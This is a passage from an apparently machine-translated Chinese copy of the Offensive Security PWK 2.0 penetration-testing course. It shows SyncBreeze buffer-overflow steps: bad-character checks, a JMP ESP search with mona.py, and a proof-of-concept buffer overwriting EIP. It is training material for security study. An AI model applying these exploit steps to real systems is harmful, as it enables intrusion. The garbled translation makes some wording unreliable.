<div style="position:absolute;top:76555;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 重复必要的步骤以识别不能包含的坏字符</font></font></nobr></div>
<div style="position:absolute;top:76574;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷。</font></font></nobr></div>
<div style="position:absolute;top:76603;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 为什么不允许使用这些字符？</font><font style="vertical-align: inherit;">这些坏的十六进制字符如何转换为 ASCII？</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:76637;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.6</font></font></i></nobr></div>
<div style="position:absolute;top:76637;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重定向执行流</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:76675;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此时，我们已经控制了 EIP 寄存器，并且我们知道我们可以将我们的 shellcode 放入一个</font></font></nobr></div>
<div style="position:absolute;top:76695;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以通过 ESP 寄存器轻松访问的存储空间。</font><font style="vertical-align: inherit;">我们也知道哪些字符</font></font></nobr></div>
<div style="position:absolute;top:76714;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对我们的缓冲区是安全的，哪些不是。</font><font style="vertical-align: inherit;">我们的下一个任务是找到一种方法来重定向执行</font></font></nobr></div>
<div style="position:absolute;top:76733;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">流向位于 ESP 寄存器当时指向的内存地址处的 shellcode</font></font></nobr></div>
<div style="position:absolute;top:76753;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的崩溃。</font></font></nobr></div>
<div style="position:absolute;top:76785;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最直观的方法是尝试用弹出的地址替换覆盖EIP的B</font></font></nobr></div>
<div style="position:absolute;top:76805;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">崩溃时在 ESP 寄存器中。</font><font style="vertical-align: inherit;">然而，正如我们前面提到的，ESP 的价值</font></font></nobr></div>
<div style="position:absolute;top:76824;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从崩溃到崩溃的变化。</font><font style="vertical-align: inherit;">堆栈地址经常变化，尤其是在线程应用程序中</font></font></nobr></div>
<div style="position:absolute;top:76843;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如 SyncBreeze，因为每个线程在内存中都有其保留的堆栈区域，由</font></font></nobr></div>
<div style="position:absolute;top:76863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统。</font></font></nobr></div>
<div style="position:absolute;top:76896;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因此，硬编码特定的堆栈地址并不是到达缓冲区的可靠方法。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:76930;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.7</font></font></i></nobr></div>
<div style="position:absolute;top:76930;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查找退货地址</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:76968;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们仍然可以将我们的 shellcode 存储在 ESP 指向的地址中，但是我们需要一种一致的方式来</font></font></nobr></div>
<div style="position:absolute;top:76987;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行该代码。</font><font style="vertical-align: inherit;">一种解决方案是利用 JMP ESP 指令，作为名称</font></font></nobr></div>
<div style="position:absolute;top:77007;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">建议，在执行时“跳转”到 ESP 指向的地址。</font><font style="vertical-align: inherit;">如果我们能找到一个可靠的、静态的</font></font></nobr></div>
<div style="position:absolute;top:77026;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含这条指令的地址，我们可以将 EIP 重定向到这个地址，并在</font></font></nobr></div>
<div style="position:absolute;top:77045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">崩溃时，将执行 JMP ESP 指令。</font><font style="vertical-align: inherit;">这种“间接跳转”将引导执行流程</font></font></nobr></div>
<div style="position:absolute;top:77065;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进入我们的shellcode。</font></font></nobr></div>
<div style="position:absolute;top:77098;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 中的许多支持库都包含这个常用指令，但我们需要找到一个</font></font></nobr></div>
<div style="position:absolute;top:77117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">符合特定条件的参考。</font><font style="vertical-align: inherit;">首先，库中使用的地址必须是静态的，即</font></font></nobr></div>
<div style="position:absolute;top:77136;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">消除了使用 ASLR 支持编译的库。</font><font style="vertical-align: inherit;">二、指令的地址一定不能</font></font></nobr></div>
<div style="position:absolute;top:77156;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含任何会破坏漏洞利用的坏字符，因为地址将是我们的一部分</font></font></nobr></div>
<div style="position:absolute;top:77175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入缓冲区。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:77395;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="66"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 66 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:77428;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:78505;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:78505;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:78505;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">386</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:77524;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用免疫调试脚本，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mona.py</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">318</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由Corelan团队开发的，开始我们</font></font></nobr></div>
<div style="position:absolute;top:77543;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回地址搜索。</font><font style="vertical-align: inherit;">首先，我们将请求有关加载的所有 DLL（或模块）的信息</font></font></nobr></div>
<div style="position:absolute;top:77562;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">!mona 模块</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将</font><font style="vertical-align: inherit;">SyncBreeze 同步到进程内存空间</font><font style="vertical-align: inherit;">以产生如下所示的输出</font></font></nobr></div>
<div style="position:absolute;top:77582;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 217：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:78072;left:329"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 217：!mona modules 命令输出</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:78103;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此输出中的列包括当前内存位置（基地址和顶地址）、大小</font></font></nobr></div>
<div style="position:absolute;top:78122;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块、几个标志、模块版本、模块名称和路径。</font></font></nobr></div>
<div style="position:absolute;top:78155;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从这个输出中的标志，我们可以看到 syncbrs.exe 可执行文件有 SafeSEH </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">319</font></font></font></nobr></div>
<div style="position:absolute;top:78174;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（结构化异常处理程序覆盖，一种防止漏洞利用的内存保护技术），</font></font></nobr></div>
<div style="position:absolute;top:78194;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ASLR 和 NXCompat（DEP 保护）已禁用。</font></font></nobr></div>
<div style="position:absolute;top:78227;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">换句话说，可执行文件没有使用任何内存保护方案进行编译，并且</font></font></nobr></div>
<div style="position:absolute;top:78246;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将始终可靠地加载到相同的地址，使其非常适合我们的目的。</font></font></nobr></div>
<div style="position:absolute;top:78279;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，它总是在基地址 0x00400000 处加载，这意味着所有指令的地址</font></font></nobr></div>
<div style="position:absolute;top:78298;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(0x004XXXXX) 将包含不适合我们的缓冲区的空字符。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:78421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">318 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Corelan，2019 年），https://github.com/corelan/mona</font></font></font></nobr></div>
<div style="position:absolute;top:78441;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">319 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2016 年），https://docs.microsoft.com/en-us/cpp/build/reference/safeseh-image-has-safe-exception-handlers?view=vs-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:78456;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2019年 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:78583;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="67"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 67 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:78616;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:79693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:79693;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:79693;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">387</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:78712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过输出搜索，我们发现 LIBSSP.DLL 也符合我们的需求和地址范围</font></font></nobr></div>
<div style="position:absolute;top:78731;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">似乎不包含坏字符。</font><font style="vertical-align: inherit;">这非常适合我们的需求。</font><font style="vertical-align: inherit;">现在我们需要找到</font></font></nobr></div>
<div style="position:absolute;top:78750;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此模块中自然出现的 JMP ESP 指令的地址。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:78813;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">高级提示：如果此应用程序是在 DEP 支持下编译的，我们的 JMP ESP</font></font></i></nobr></div>
<div style="position:absolute;top:78832;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地址必须位于模块的 .text 代码段中，如</font></font></i></nobr></div>
<div style="position:absolute;top:78851;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是唯一具有读取 (R) 和可执行 (E) 权限的段。</font></font></i></nobr></div>
<div style="position:absolute;top:78871;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，由于未启用 DEP，我们可以自由使用任何来自</font></font></i></nobr></div>
<div style="position:absolute;top:78890;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本模块中的地址。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:78952;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以在 Immunity Debugger 中使用本机命令来搜索我们的 JMP ESP</font></font></nobr></div>
<div style="position:absolute;top:78971;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指令，但必须在 DLL 内的多个数据区域上执行搜索。</font><font style="vertical-align: inherit;">反而，</font></font></nobr></div>
<div style="position:absolute;top:78990;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mona.py</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对二进制或十六进制表示进行详尽的搜索</font></font></nobr></div>
<div style="position:absolute;top:79010;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（或</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作码</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）的汇编指令。</font></font></nobr></div>
<div style="position:absolute;top:79043;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要找到等效于 JMP ESP 的操作码，我们可以使用 Metasploit NASM Shell ruby​​ 脚本，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf-</font></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:79063;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nasm_shell </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它产生如清单 357 所示的结果：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:79097;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf-nasm_shell</font></font></font></b></nobr></div>
<div style="position:absolute;top:79114;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nasm &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">jmp esp</font></font></font></b></nobr></div>
<div style="position:absolute;top:79131;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00000000 FFE4    </font></font></nobr></div>
<div style="position:absolute;top:79131;left:336"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">jmp esp</font></font></nobr></div>
<div style="position:absolute;top:79148;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">纳斯姆 &gt;</font></font></nobr></div>
<div style="position:absolute;top:79167;left:332"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 357 - 查找 JMP ESP 的操作码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:79197;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用操作码 (0xFFE4) 的所有部分中的十六进制表示来搜索 JMP ESP</font></font></nobr></div>
<div style="position:absolute;top:79216;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LIBSSP.DLL 与</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mona.py find</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:79249;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-s</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和操作码十六进制字符串的转义值</font><font style="vertical-align: inherit;">指定搜索的内容</font><font style="vertical-align: inherit;">，</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:79269;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“\xff\xe4” </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">此外，我们使用</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-m</font></font></b><font style="vertical-align: inherit;"><font style="font-size:14px"><font style="vertical-align: inherit;">选项</font></font><font style="font-size:14px"><font style="vertical-align: inherit;">提供所需模块的名称</font></font></font><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:79301;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最终命令</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">!mona find -s “\xff\xe4” -m “libspp.dll”</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的输出显示在</font></font></nobr></div>
<div style="position:absolute;top:79321;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 218：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:79594;left:326"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 218：使用 mona.py 搜索操作码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:79624;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在此示例中，输出显示一个包含 JMP ESP 指令 (0x10090c83) 的地址，</font></font></nobr></div>
<div style="position:absolute;top:79644;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">幸运的是，该地址不包含我们的任何不良字符。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:79771;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="68"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 68 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:79804;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:80881;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:80881;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:80881;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">388</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:79900;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要在反汇编窗口中查看 0x10090c83 的内容，在暂停执行时，我们</font></font></nobr></div>
<div style="position:absolute;top:79919;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将单击“Go to address in Disassembler”按钮（图 219）并输入地址。</font><font style="vertical-align: inherit;">从这里</font></font></nobr></div>
<div style="position:absolute;top:79938;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以看到它确实转换为 JMP ESP 指令。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:80138;left:282"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 219：跳转到反汇编窗口中的特定地址</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:80169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们在崩溃时将 EIP 重定向到这个地址，就会执行 JMP ESP 指令，</font></font></nobr></div>
<div style="position:absolute;top:80188;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这将导致执行流程进入我们的 shellcode。</font></font></nobr></div>
<div style="position:absolute;top:80221;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以通过更新</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">eip</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量来</font><font style="vertical-align: inherit;">测试这一点，</font><font style="vertical-align: inherit;">以在我们的概念证明中反映这个地址：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:80256;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:80272;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">填充物 = "A" * 780</font></font></nobr></div>
<div style="position:absolute;top:80289;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">eip = </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x83\x0c\x09\x10"</font></font></font></b></nobr></div>
<div style="position:absolute;top:80307;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">偏移=“C”* 4</font></font></nobr></div>
<div style="position:absolute;top:80324;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 = "D" * (1500 - len(filler) - len(eip) - len(offset))</font></font></nobr></div>
<div style="position:absolute;top:80357;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">inputBuffer = 填充符 + eip + 偏移量 + 缓冲区</font></font></nobr></div>
<div style="position:absolute;top:80374;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:80394;left:379"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 358 - 重定向 EIP</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:80423;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，上面输入的地址顺序相反。</font><font style="vertical-align: inherit;">这是因为 endian </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">320</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字节顺序。</font></font></nobr></div>
<div style="position:absolute;top:80442;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统可以以不同的格式在内存中存储地址和数据。</font><font style="vertical-align: inherit;">一般来说</font></font></nobr></div>
<div style="position:absolute;top:80462;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">说起来，用于在内存中存储地址的格式取决于操作的架构</font></font></nobr></div>
<div style="position:absolute;top:80481;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统正在运行。</font><font style="vertical-align: inherit;">小端是目前使用最广泛的格式，它被</font></font></nobr></div>
<div style="position:absolute;top:80501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86 和 AMD64 架构，而大端序在历史上被 Sparc 和 PowerPC 使用</font></font></nobr></div>
<div style="position:absolute;top:80520;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">架构。</font><font style="vertical-align: inherit;">在小端格式中，数字的低位字节存储在内存中</font></font></nobr></div>
<div style="position:absolute;top:80539;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最低地址，最高地址为高位字节。</font><font style="vertical-align: inherit;">因此，我们必须存储</font></font></nobr></div>
<div style="position:absolute;top:80559;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的缓冲区中以相反的顺序返回地址，以便 CPU 在内存中正确解释它。</font></font></nobr></div>
<div style="position:absolute;top:80591;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在调试器中</font><font style="vertical-align: inherit;">使用</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">@</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，我们将在地址 0x10090c83 处放置一个断点，以便遵循</font></font></nobr></div>
<div style="position:absolute;top:80611;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行 JMP ESP 指令，然后我们再次运行我们的漏洞利用。</font><font style="vertical-align: inherit;">结果显示在</font></font></nobr></div>
<div style="position:absolute;top:80630;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 220：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:80831;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">320 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），http://en.wikipedia.org/wiki/Endianness</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:80959;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="69"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 69 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:80992;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:82069;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:82069;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:82069;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">389</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:81279;left:317"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 220：LIPSSP.DLL 中 JMP ESP 的断点</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:81311;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的调试器显示我们确实到达了我们的 JMP ESP 并击中​​了我们之前的断点</font></font></nobr></div>
<div style="position:absolute;top:81330;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">放。</font><font style="vertical-align: inherit;">在调试器中</font><font style="vertical-align: inherit;">按</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&amp;</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将单步进入我们的 shellcode 占位符，它当前是</font></font></nobr></div>
<div style="position:absolute;top:81349;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只是一堆D。</font></font></nobr></div>
<div style="position:absolute;top:81382;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">伟大的！</font><font style="vertical-align: inherit;">现在我们只需要生成可用的 shellcode，我们的漏洞利用就完成了。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:81417;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.7.1 练习</font></font></i></nobr></div>
</span></font>
